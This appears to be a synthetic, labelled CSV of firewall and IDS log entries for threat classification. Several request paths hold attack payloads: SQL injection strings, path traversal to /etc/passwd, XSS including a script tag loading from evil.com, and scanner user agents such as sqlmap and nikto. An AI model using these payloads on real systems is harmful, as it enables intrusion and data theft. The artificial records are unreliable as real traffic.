timestamp,source_ip,dest_ip,protocol,action,threat_label,log_type,bytes_transferred,user_agent,request_path
2024-05-01T14:46:33,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,610,python-requests/2.28.0,/admin/login.php
2024-05-02T00:19:51,192.168.1.190,192.168.1.163,HTTP,blocked,malicious,ids,1186,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/api?filter=SELECT username FROM users
2024-05-01T15:33:17,192.168.1.177,192.168.1.97,SSH,allowed,benign,application,8929,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/
2024-05-01T14:24:06,192.168.1.55,192.168.1.10,TCP,allowed,suspicious,firewall,4850501,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/upload
2024-05-02T07:59:52,192.168.1.189,192.168.1.9,HTTP,allowed,benign,ids,6257,python-requests/2.28.0,/dashboard
2024-05-02T02:40:20,192.168.1.158,192.168.1.146,HTTP,allowed,suspicious,ids,1222,gobuster/3.1,/wp-admin/
2024-05-03T04:28:07,192.168.1.228,192.168.1.251,HTTP,allowed,malicious,ids,748,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/read?f=%2e%2e%2f%2e%2e%2fetc%2fpasswd
2024-05-02T13:45:06,192.168.1.104,192.168.1.179,HTTP,blocked,suspicious,ids,492,gobuster/3.1,/.git/
2024-05-02T03:03:34,192.168.1.58,192.168.1.206,HTTP,allowed,malicious,ids,241,curl/7.85,/assets/..%5C..%5Cwindows%5Csystem32
2024-05-02T10:00:51,192.168.1.58,192.168.1.138,TCP,blocked,malicious,ids,1036,python-requests/2.28.0,/name?v=<ScRiPt>alert(xss)</ScRiPt>
2024-05-01T22:35:47,192.168.1.198,192.168.1.231,HTTP,allowed,malicious,ids,979,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/view?doc=..%252f..%252fetc%252fpasswd
2024-05-03T01:34:37,192.168.1.143,192.168.1.195,TCP,allowed,suspicious,ids,1422,gobuster/3.1,/robots.txt
2024-05-02T06:57:58,192.168.1.139,192.168.1.89,HTTP,allowed,malicious,ids,102,curl/7.85,/assets/..%5C..%5Cwindows%5Csystem32
2024-05-02T13:17:49,192.168.1.70,192.168.1.212,HTTP,allowed,malicious,ids,344,python-requests/2.28.0,/files/../../etc/passwd
2024-05-02T14:38:03,192.168.1.133,192.168.1.134,ICMP,allowed,benign,firewall,28467,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/index.html
2024-05-01T14:41:18,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,632,python-requests/2.28.0,/admin/login.php
2024-05-01T14:57:57,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,434,python-requests/2.28.0,/admin/login.php
2024-05-01T14:58:42,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,719,python-requests/2.28.0,/admin/login.php
2024-05-01T14:57:27,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,312,python-requests/2.28.0,/admin/login.php
2024-05-01T14:58:06,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,538,python-requests/2.28.0,/admin/login.php
2024-05-03T10:20:44,192.168.1.235,192.168.1.178,HTTP,allowed,benign,ids,26174,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/admin/login.php
2024-05-01T14:56:15,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,280,python-requests/2.28.0,/admin/login.php
2024-05-02T03:03:59,192.168.1.78,192.168.1.4,TCP,allowed,suspicious,ids,193,sqlmap/1.7,/wp-admin/
2024-05-03T04:40:07,192.168.1.49,192.168.1.5,TCP,allowed,benign,application,16406,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/ssh
2024-05-01T22:10:57,192.168.1.190,192.168.1.14,HTTP,allowed,benign,application,9778,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/
2024-05-03T01:17:35,192.168.1.89,192.168.1.234,TCP,allowed,malicious,ids,653,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/files/../../etc/passwd
2024-05-02T09:28:36,192.168.1.155,192.168.1.166,UDP,allowed,benign,ids,29256,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/index.html
2024-05-03T00:56:57,192.168.1.119,192.168.1.115,SSH,allowed,benign,ids,32014,python-requests/2.28.0,/login
2024-05-02T06:04:21,192.168.1.156,192.168.1.184,TCP,allowed,benign,firewall,13779,curl/7.85,/login
2024-05-03T09:14:53,192.168.1.13,192.168.1.170,TCP,allowed,benign,application,1393,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login
2024-05-02T01:36:10,192.168.1.128,192.168.1.132,TCP,allowed,malicious,ids,731,curl/7.85,/search?q=1 OR 1=1
2024-05-03T05:13:05,192.168.1.124,192.168.1.89,HTTP,allowed,suspicious,ids,1032,gobuster/3.1,/admin/
2024-05-03T00:28:18,192.168.1.65,192.168.1.10,HTTP,allowed,malicious,ids,831,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/search?q=1' AND '1'='1
2024-05-02T14:41:16,192.168.1.250,192.168.1.48,TCP,allowed,malicious,ids,852,python-requests/2.28.0,/items?category=1 AND 1=1
2024-05-02T05:20:47,192.168.1.98,192.168.1.149,TCP,allowed,benign,ids,23797,python-requests/2.28.0,/admin/login.php
2024-05-03T07:51:23,192.168.1.76,192.168.1.180,HTTP,blocked,suspicious,ids,1799,sqlmap/1.7,/robots.txt
2024-05-02T07:32:28,192.168.1.85,192.168.1.249,SSH,allowed,benign,firewall,33322,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/ftp
2024-05-01T14:41:30,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,420,python-requests/2.28.0,/admin/login.php
2024-05-01T14:00:38,192.168.1.99,192.168.1.20,TCP,allowed,suspicious,firewall,4121442,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/upload
2024-05-01T14:59:27,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,571,python-requests/2.28.0,/admin/login.php
2024-05-02T23:17:31,192.168.1.250,192.168.1.31,ICMP,allowed,benign,ids,20786,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/
2024-05-03T09:01:12,192.168.1.42,192.168.1.166,UDP,allowed,benign,firewall,16069,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/index.php
2024-05-01T19:13:01,192.168.1.69,192.168.1.199,UDP,allowed,benign,ids,5971,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/ftp
2024-05-01T14:57:54,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,260,python-requests/2.28.0,/admin/login.php
2024-05-01T14:58:03,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,317,python-requests/2.28.0,/admin/login.php
2024-05-01T14:00:22,192.168.1.99,192.168.1.20,TCP,allowed,suspicious,firewall,3445378,python-requests/2.28.0,/upload
2024-05-01T19:37:17,192.168.1.186,192.168.1.84,UDP,allowed,benign,firewall,32099,python-requests/2.28.0,/login
2024-05-01T21:31:17,192.168.1.7,192.168.1.23,TCP,blocked,malicious,ids,1322,python-requests/2.28.0,"/input?val=data:text/html,<script>alert(1)</script>"
2024-05-01T14:19:26,192.168.1.181,192.168.1.55,HTTP,allowed,malicious,ids,228,python-requests/2.28.0,/search?q=<script src='http://evil.com/x.js'>
2024-05-01T14:45:57,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,450,python-requests/2.28.0,/admin/login.php
2024-05-02T18:00:45,192.168.1.219,192.168.1.124,TCP,blocked,suspicious,ids,881,nikto/2.1.6,/phpinfo.php
2024-05-01T14:56:33,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,331,python-requests/2.28.0,/admin/login.php
2024-05-03T00:25:48,192.168.1.100,192.168.1.175,SSH,allowed,benign,ids,10494,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login
2024-05-01T23:56:31,192.168.1.50,192.168.1.209,TCP,allowed,malicious,ids,937,curl/7.85,/update?field=vbscript:msgbox(1)
2024-05-03T13:54:30,192.168.1.126,192.168.1.135,ICMP,allowed,benign,application,16873,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/ssh
2024-05-03T00:54:55,192.168.1.202,192.168.1.222,HTTP,blocked,malicious,ids,1024,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/files/../../etc/passwd
2024-05-01T14:59:24,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,314,python-requests/2.28.0,/admin/login.php
2024-05-02T23:05:33,192.168.1.85,192.168.1.144,ICMP,allowed,benign,application,31107,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/index.html
2024-05-02T20:04:00,192.168.1.49,192.168.1.219,TCP,allowed,benign,firewall,9053,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/login
2024-05-01T23:07:33,192.168.1.249,192.168.1.82,HTTP,allowed,malicious,ids,1054,python-requests/2.28.0,/search?q=1' AND '1'='1
2024-05-01T14:58:54,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,403,python-requests/2.28.0,/admin/login.php
2024-05-03T12:22:37,192.168.1.117,192.168.1.159,UDP,allowed,benign,ids,32343,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/ssh
2024-05-03T08:44:47,192.168.1.37,192.168.1.193,TCP,blocked,malicious,ids,712,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/profile?bio=<img src=x onerror=alert(1)>
2024-05-02T22:16:11,192.168.1.161,192.168.1.33,HTTP,allowed,benign,application,11280,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/
2024-05-01T14:24:44,192.168.1.55,192.168.1.10,UDP,allowed,suspicious,firewall,2925177,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/upload
2024-05-01T14:24:10,192.168.1.55,192.168.1.10,UDP,allowed,suspicious,firewall,3118653,curl/7.85,/upload
2024-05-02T17:40:17,192.168.1.245,192.168.1.82,HTTP,blocked,suspicious,ids,1364,dirb/2.22,/wp-admin/
2024-05-01T14:59:03,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,365,python-requests/2.28.0,/admin/login.php
2024-05-01T16:37:33,192.168.1.93,192.168.1.62,TCP,allowed,benign,firewall,5791,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/ftp
